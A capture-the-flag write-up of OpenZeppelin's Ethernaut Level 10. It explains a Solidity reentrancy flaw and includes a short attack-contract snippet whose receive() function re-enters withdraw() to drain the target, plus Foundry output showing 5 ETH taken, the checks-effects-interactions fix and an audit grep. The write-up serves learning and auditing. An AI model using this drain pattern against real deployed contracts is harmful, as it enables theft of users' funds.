# Ethernaut - Level 10: Reentrancy

| Field | Details |
|-------|---------|
| Platform | Ethernaut by OpenZeppelin |
| Level | 10 |
| Vulnerability | Reentrancy - CEI Violation |
| Severity | Critical |
| Status | Solved |
| Real-World Reference | The DAO Hack 2016 - $60M stolen |

## Objective
Steal all funds from the contract.

## Root Cause
withdraw() violates Checks-Effects-Interactions pattern:
1. CHECK    - if (balances[msg.sender] >= _amount)
2. INTERACT - msg.sender.call{value: _amount}("") - external call FIRST
3. EFFECT   - balances[msg.sender] -= _amount - state updated TOO LATE

When ETH is sent to attacker contract, its receive() triggers before
balance is updated - re-entering withdraw() with balance still intact.
Repeats until contract is empty.

## Proof of Concept
Attack contract re-enters withdraw() on every ETH receive:

receive() external payable {
    if (address(target).balance >= attackAmount) {
        target.withdraw(attackAmount);
    }
}

Foundry Result:
Target balance before: 5 ETH
Target balance after:  0 ETH
Attacker profit:       5 ETH
PASS testReentrancyExploit()

## Fix
Update state BEFORE external call:
balances[msg.sender] -= _amount;  // effect first
(bool result,) = msg.sender.call{value: _amount}("");  // then interact

## Real World Impact
- The DAO 2016: $60M
- Lendf.me 2020: $25M
- Cream Finance 2021: $18.8M

## Key Takeaways
Always update state BEFORE external calls.
Every .call(), .transfer(), .send() is a potential reentry point.

Audit grep:
grep -n ".call{value" contracts/*.sol

## Status
- Solved on Ethernaut
- Attack contract written
- Foundry exploit written and passing
- Added to GitHub
